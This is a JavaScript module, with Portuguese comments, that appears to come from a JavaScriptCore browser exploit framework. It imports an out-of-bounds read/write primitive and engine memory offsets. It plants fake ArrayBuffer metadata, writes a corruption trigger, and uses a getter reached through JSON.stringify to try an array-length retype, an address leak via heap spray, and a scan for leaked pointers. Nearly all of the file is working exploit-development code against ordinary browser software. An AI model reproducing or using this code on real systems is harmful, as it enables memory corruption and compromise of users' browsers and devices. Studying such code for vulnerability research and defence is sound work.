// js/script3/testRetypeOOB_AB_ViaShadowCraft.mjs
import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_dataview_real,
    oob_write_absolute,
    oob_read_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

const GETTER_CHECKPOINT_PROPERTY_NAME = "AAAA_GetterForMassiveAttack";
let getter_called_flag = false;
let current_test_results = {
    overall_success: false,
    message: "Teste não iniciado.",
    length_retype_success: false,
    length_retype_details: "",
    addrof_spray_success: false,
    addrof_spray_leaks: [],
    snoop_success: false,
    snoop_leaks: [],
    fresh_ab_test_details: "",
    api_interaction_errors: [], // Mantido para consistência, mas não usado neste script
    error: null
};

const CORRUPTION_OFFSET_TRIGGER = (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16; // 0x70
const CORRUPTION_VALUE_TRIGGER = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF);

// Para Teste 1: Metadados sombra para tamanho gigante
const FAKE_AB_CONTENTS_OFFSET_FOR_RETYPE = 0x0; 
const FAKE_AB_HUGE_SIZE = new AdvancedInt64(0x7FFFFFF0, 0x0); 
const FAKE_AB_DATA_POINTER_FOR_RETYPE = new AdvancedInt64(0x0, 0x0);

class CheckpointForMassiveAttack {
    constructor(id) {
        this.id_marker = `MassiveAttackCheckpoint-${id}`;
    }

    get [GETTER_CHECKPOINT_PROPERTY_NAME]() {
        getter_called_flag = true;
        const FNAME_GETTER = "MassiveAttack_Getter";
        logS3(`Getter "${GETTER_CHECKPOINT_PROPERTY_NAME}" FOI CHAMADO! Iniciando bateria de testes...`, "vuln", FNAME_GETTER);
        
        current_test_results = {
            overall_success: false, message: "Getter chamado, testes em andamento.",
            length_retype_success: false, length_retype_details: "",
            addrof_spray_success: false, addrof_spray_leaks: [],
            snoop_success: false, snoop_leaks: [],
            fresh_ab_test_details: "", api_interaction_errors: [], error: null
        };

        try {
            if (!oob_array_buffer_real || !oob_write_absolute || !oob_read_absolute || !JSC_OFFSETS.ArrayBufferContents || !JSC_OFFSETS.ArrayBuffer) {
                throw new Error("Dependências críticas (OOB R/W, oob_ab, Offsets) não disponíveis no getter.");
            }

            // --- Teste 1: Re-tentativa de Re-Tipagem de Length do oob_array_buffer_real ---
            logS3("DENTRO DO GETTER (Teste 1): Tentando Re-Tipagem de Length do oob_array_buffer_real...", "subtest", FNAME_GETTER);
            let t1_details = "";
            try {
                oob_write_absolute(FAKE_AB_CONTENTS_OFFSET_FOR_RETYPE + JSC_OFFSETS.ArrayBufferContents.SIZE_IN_BYTES_OFFSET_FROM_CONTENTS_START, FAKE_AB_HUGE_SIZE, 8);
                oob_write_absolute(FAKE_AB_CONTENTS_OFFSET_FOR_RETYPE + JSC_OFFSETS.ArrayBufferContents.DATA_POINTER_OFFSET_FROM_CONTENTS_START, FAKE_AB_DATA_POINTER_FOR_RETYPE, 8);
                t1_details = `Metadados sombra (size=${FAKE_AB_HUGE_SIZE.toString(true)}) plantados em oob_data[${toHex(FAKE_AB_CONTENTS_OFFSET_FOR_RETYPE)}]. `;
                
                const reader = new Uint32Array(oob_array_buffer_real);
                t1_details += `Uint32Array criado. Length reportado: ${reader.length}. oob_ab.byteLength: ${oob_array_buffer_real.byteLength}.`;
                logS3(t1_details, "info", FNAME_GETTER);

                if (reader.length * 4 === FAKE_AB_HUGE_SIZE.low() && FAKE_AB_HUGE_SIZE.low() > oob_array_buffer_real.byteLength) {
                    current_test_results.length_retype_success = true;
                    current_test_results.overall_success = true;
                    const success_msg = "SUCESSO NA RE-TIPAGEM DE LENGTH DO OOB_AB! ";
                    current_test_results.message = current_test_results.message.includes("Getter chamado") ? success_msg : current_test_results.message + "; " + success_msg;
                    logS3(success_msg, "vuln", FNAME_GETTER);
                    
                    const oob_idx = (oob_array_buffer_real.byteLength / 4) + 50;
                    if (oob_idx < reader.length) {
                        const val = reader[oob_idx];
                        t1_details += ` Leitura OOB em [${oob_idx}]=${toHex(val)}.`;
                        logS3(`Leitura OOB em reader[${oob_idx}]=${toHex(val)}`, "leak", FNAME_GETTER);
                    }
                } else {
                     t1_details += ` Falha na re-tipagem de length (Esperado ${FAKE_AB_HUGE_SIZE.low()/4}).`;
                }
            } catch (e1) {
                t1_details += ` Erro: ${e1.message}.`;
                logS3(`Erro no Teste 1 (Re-Tipagem Length): ${e1.message}`, "error", FNAME_GETTER);
            }
            current_test_results.length_retype_details = t1_details;

            // --- Teste 2: Tentativa de addrof Especulativo com Spray ---
            logS3("DENTRO DO GETTER (Teste 2): Tentando addrof especulativo com spray...", "subtest", FNAME_GETTER);
            let t2_leaks = [];
            try {
                const target_obj_addrof = { leak_marker_prop: 0xABCD0000 + Math.floor(Math.random()*0xFF) };
                const spray_size_t2 = 100; // Reduzido para logs mais curtos, aumente se necessário
                let float_readers_t2 = [];
                let obj_holders_t2 = [];
                const float_pattern_addrof_t2 = Math.sqrt(2);

                for(let i=0; i<spray_size_t2; i++) {
                    let fa = new Float64Array(4); // Menor para mais arrays
                    for(let k=0; k<fa.length; k++) fa[k] = float_pattern_addrof_t2 + i;
                    float_readers_t2.push(fa);
                    obj_holders_t2.push( (i === Math.floor(spray_size_t2 / 2)) ? [target_obj_addrof] : [{dummy_obj:i}] );
                }
                let leak_found_in_spray_t2 = false;
                for(let i=0; i<float_readers_t2.length; i++) {
                    for(let j=0; j<float_readers_t2[i].length; j++) {
                        if (float_readers_t2[i][j] !== (float_pattern_addrof_t2 + i)) {
                            const f_val = float_readers_t2[i][j];
                            const dv_t2 = new DataView(new ArrayBuffer(8));
                            dv_t2.setFloat64(0, f_val, true);
                            const p_low_t2 = dv_t2.getUint32(0, true);
                            const p_high_t2 = dv_t2.getUint32(4, true);
                            const p_adv64_t2 = new AdvancedInt64(p_low_t2, p_high_t2);
                            t2_leaks.push(`FloatArray[${i}][${j}] = ${p_adv64_t2.toString(true)} (float: ${f_val})`);
                            leak_found_in_spray_t2 = true;
                        }
                    }
                }
                if (leak_found_in_spray_t2) {
                    current_test_results.addrof_spray_success = true;
                    current_test_results.overall_success = true;
                    const success_msg_t2 = "POTENCIAL LEAK DE ENDEREÇO NO SPRAY DE FLOAT!";
                    current_test_results.message = current_test_results.message.includes("Getter chamado") ? success_msg_t2 : current_test_results.message + "; " + success_msg_t2;
                    logS3(success_msg_t2, "vuln", FNAME_GETTER);
                }
                t2_leaks.unshift(`Spray de ${spray_size_t2} arrays concluído.`);
            } catch (e2) {
                t2_leaks.push(`Erro no Teste 2 (AddrOf Spray): ${e2.message}`);
                logS3(`Erro no Teste 2 (AddrOf Spray): ${e2.message}`, "error", FNAME_GETTER);
            }
            current_test_results.addrof_spray_leaks = t2_leaks;

            // --- Teste 3: Sondagem Ampla do oob_array_buffer_real por Ponteiros Vazados ---
            logS3("DENTRO DO GETTER (Teste 3): Sondando oob_array_buffer_real por ponteiros vazados...", "subtest", FNAME_GETTER);
            let t3_leaks = [];
            try {
                const snoop_end_t3 = Math.min(0x200, oob_array_buffer_real.byteLength); // Primeiros 512 bytes
                let ptr_found_in_snoop_t3 = false;
                for (let offset = 0; offset < snoop_end_t3; offset += 8) {
                    if (offset === CORRUPTION_OFFSET_TRIGGER) continue;
                    const val64_t3 = oob_read_absolute(offset, 8);
                    if (!val64_t3.equals(AdvancedInt64.Zero)) {
                        const val_str_t3 = val64_t3.toString(true);
                        t3_leaks.push(`${toHex(offset)}: ${val_str_t3}`);
                        if (val64_t3.high() > 0x1000 && val64_t3.high() < 0x80000000 && !val64_t3.equals(CORRUPTION_VALUE_TRIGGER)) {
                             logS3(`PONTEIRO SUSPEITO em oob_data[${toHex(offset)}] = ${val_str_t3}`, "leak", FNAME_GETTER);
                             ptr_found_in_snoop_t3 = true;
                        }
                    }
                }
                if (ptr_found_in_snoop_t3) {
                    current_test_results.snoop_success = true;
                    current_test_results.overall_success = true;
                }
                t3_leaks.unshift(`Sondagem de ${toHex(snoop_end_t3)} bytes concluída.`);
            } catch (e3) {
                t3_leaks.push(`Erro no Teste 3 (Sondagem): ${e3.message}`);
                logS3(`Erro no Teste 3 (Sondagem): ${e3.message}`, "error", FNAME_GETTER);
            }
            current_test_results.snoop_leaks = t3_leaks;

            // --- Teste 4: ArrayBuffer "Fresco" ---
            logS3("DENTRO DO GETTER (Teste 4): Verificando ArrayBuffer 'fresco'...", "subtest", FNAME_GETTER);
            let t4_details = "";
            try {
                let fresh_ab_t4 = new ArrayBuffer(128);
                let dv_fresh_t4 = new DataView(fresh_ab_t4);
                dv_fresh_t4.setUint32(0, 0x42424242, true);
                if (fresh_ab_t4.byteLength === 128 && dv_fresh_t4.getUint32(0,true) === 0x42424242) {
                    t4_details = "AB fresco funciona normalmente.";
                } else {
                    t4_details = `AB fresco ANÔMALO! Length: ${fresh_ab_t4.byteLength}, Conteúdo[0]: ${toHex(dv_fresh_t4.getUint32(0,true))}`;
                    current_test_results.overall_success = true; // Anomalia é sucesso especulativo
                }
                logS3(t4_details, current_test_results.overall_success && t4_details.includes("ANÔMALO") ? "vuln" : "info", FNAME_GETTER);
            } catch (e4) {
                t4_details = `Erro no Teste 4 (AB Fresco): ${e4.message}`;
                logS3(t4_details, "error", FNAME_GETTER);
            }
            current_test_results.fresh_ab_test_details = t4_details;
            
            if (!current_test_results.overall_success) {
                current_test_results.message = "Bateria de testes no getter concluída, sem sucesso óbvio em re-tipagem ou vazamento.";
            } else {
                 current_test_results.message = "Bateria de testes no getter CONCLUÍDA COM POTENCIAL SUCESSO em um ou mais sub-testes!";
            }

        } catch (e_getter_main) {
            logS3(`DENTRO DO GETTER: ERRO PRINCIPAL NO GETTER: ${e_getter_main.message}`, "critical", FNAME_GETTER);
            current_test_results.error = String(e_getter_main);
            current_test_results.message = `Erro principal no getter: ${e_getter_main.message}`;
        }
        return 0xBADF00D;
    }

    toJSON() {
        const FNAME_toJSON = "CheckpointForMassiveAttack.toJSON";
        logS3(`toJSON para: ${this.id_marker}. Acessando getter...`, "info", FNAME_toJSON);
        // eslint-disable-next-line no-unused-vars
        const _ = this[GETTER_CHECKPOINT_PROPERTY_NAME];
        return { id: this.id_marker, processed_by_massive_attack_test: true };
    }
}

export async function executeRetypeOOB_AB_Test() {
    const FNAME_TEST_RUNNER = "executeMassiveAttackInGetter";
    logS3(`--- Iniciando Bateria de Testes Agressivos no Getter ---`, "test", FNAME_TEST_RUNNER);

    getter_called_flag = false;
    // Reset inicial de current_test_results
    current_test_results = {
        overall_success: false, message: "Teste não executado.",
        length_retype_success: false, length_retype_details: "",
        addrof_spray_success: false, addrof_spray_leaks: [],
        snoop_success: false, snoop_leaks: [],
        fresh_ab_test_details: "", api_interaction_errors: [], error: null
    };


    if (!JSC_OFFSETS.ArrayBufferContents || !JSC_OFFSETS.ArrayBuffer?.KnownStructureIDs?.ArrayBuffer_STRUCTURE_ID || !JSC_OFFSETS.JSCell) {
        logS3("Offsets JSC críticos ausentes.", "critical", FNAME_TEST_RUNNER);
        current_test_results.message = "Offsets JSC críticos ausentes.";
        return;
    }

    try {
        await triggerOOB_primitive();
        if (!oob_array_buffer_real || !oob_dataview_real) {
            logS3("OOB Init falhou.", "critical", FNAME_TEST_RUNNER);
            current_test_results.message = "OOB Init falhou.";
            return;
        }
        logS3(`Ambiente OOB inicializado. oob_ab_len: ${oob_array_buffer_real.byteLength}`, "info", FNAME_TEST_RUNNER);

        // Plantar metadados sombra para Teste 1 (Re-tipagem de Length) ANTES da escrita gatilho
        logS3(`Plantando metadados sombra para Teste 1 (size=${FAKE_AB_HUGE_SIZE.toString(true)}) em oob_data[${toHex(FAKE_AB_CONTENTS_OFFSET_FOR_RETYPE)}]...`, "info", FNAME_TEST_RUNNER);
        oob_write_absolute(FAKE_AB_CONTENTS_OFFSET_FOR_RETYPE + JSC_OFFSETS.ArrayBufferContents.SIZE_IN_BYTES_OFFSET_FROM_CONTENTS_START, FAKE_AB_HUGE_SIZE, 8);
        oob_write_absolute(FAKE_AB_CONTENTS_OFFSET_FOR_RETYPE + JSC_OFFSETS.ArrayBufferContents.DATA_POINTER_OFFSET_FROM_CONTENTS_START, FAKE_AB_DATA_POINTER_FOR_RETYPE, 8);
        
        // Escrita OOB Gatilho
        oob_write_absolute(CORRUPTION_OFFSET_TRIGGER, CORRUPTION_VALUE_TRIGGER, 8);
        logS3(`Escrita OOB gatilho em ${toHex(CORRUPTION_OFFSET_TRIGGER)} completada.`, "info", FNAME_TEST_RUNNER);

        const checkpoint_obj = new CheckpointForMassiveAttack(1);
        logS3(`CheckpointForMassiveAttack objeto criado: ${checkpoint_obj.id_marker}`, "info", FNAME_TEST_RUNNER);
        
        logS3(`Chamando JSON.stringify(checkpoint_obj)...`, "info", FNAME_TEST_RUNNER);
        try {
            JSON.stringify(checkpoint_obj);
        } catch (e) { 
            logS3(`Erro em JSON.stringify: ${e.message}`, "error", FNAME_TEST_RUNNER);
            if(!getter_called_flag) { // Se o erro ocorreu antes do getter
                current_test_results.error = String(e);
                current_test_results.message = `Erro em JSON.stringify (antes do getter): ${e.message}`;
            }
        }

    } catch (mainError) {
        logS3(`Erro principal no runner: ${mainError.message}`, "critical", FNAME_TEST_RUNNER);
        console.error(mainError);
        current_test_results.message = `Erro crítico no runner: ${mainError.message}`;
        current_test_results.error = String(mainError);
    } finally {
        logS3("Limpeza finalizada.", "info", "CleanupRunner");
    }

    // Log dos resultados consolidados
    if (getter_called_flag) {
        if (current_test_results.overall_success) {
            logS3(`RESULTADO BATERIA DE TESTES: SUCESSO GERAL ESPECULATIVO! ${current_test_results.message}`, "vuln", FNAME_TEST_RUNNER);
        } else {
            logS3(`RESULTADO BATERIA DE TESTES: Getter chamado. ${current_test_results.message}`, "warn", FNAME_TEST_RUNNER);
        }
        logS3(`  Detalhes Re-Tipagem Length: Success=${current_test_results.length_retype_success}. ${current_test_results.length_retype_details}`, "info", FNAME_TEST_RUNNER);
        
        logS3(`  Detalhes AddrOf Spray: Success=${current_test_results.addrof_spray_success}. Leaks Encontrados: ${current_test_results.addrof_spray_leaks.length > 1 ? current_test_results.addrof_spray_leaks.length-1 : 0}`, "info", FNAME_TEST_RUNNER);
        current_test_results.addrof_spray_leaks.forEach(l => {
            if (typeof l === 'object') { // Log formatado para objetos de leak
                logS3(`    ${l.source || 'Item'}: Float=${l.float_value}, Hex64=${l.hex_value}`, "leak", FNAME_TEST_RUNNER);
            } else { // Log para mensagens de string (ex: "Spray concluído")
                logS3(`    ${l}`, "info", FNAME_TEST_RUNNER);
            }
        });

        logS3(`  Detalhes Sondagem oob_ab: Success=${current_test_results.snoop_success}. Leaks Encontrados: ${current_test_results.snoop_leaks.length > 1 ? current_test_results.snoop_leaks.length-1 : 0}`, "info", FNAME_TEST_RUNNER);
        current_test_results.snoop_leaks.forEach(l => {
             if (typeof l === 'object') {
                logS3(`    Offset ${l.offset}: ${l.value}`, "leak", FNAME_TEST_RUNNER);
            } else {
                logS3(`    ${l}`, "info", FNAME_TEST_RUNNER);
            }
        });
        logS3(`  Detalhes AB Fresco: ${current_test_results.fresh_ab_test_details}`, "info", FNAME_TEST_RUNNER);
        
        if (current_test_results.error) {
            logS3(`  Erro Geral no Getter: ${current_test_results.error}`, "error", FNAME_TEST_RUNNER);
        }

    } else {
        logS3("RESULTADO BATERIA DE TESTES: Getter NÃO foi chamado.", "error", FNAME_TEST_RUNNER);
        if (current_test_results.error) {
            logS3(`  Erro que impediu chamada do getter: ${current_test_results.error}`, "error", FNAME_TEST_RUNNER);
        }
    }

    clearOOBEnvironment();
    logS3(`--- Bateria de Testes Agressivos no Getter Concluída ---`, "test", FNAME_TEST_RUNNER);
}
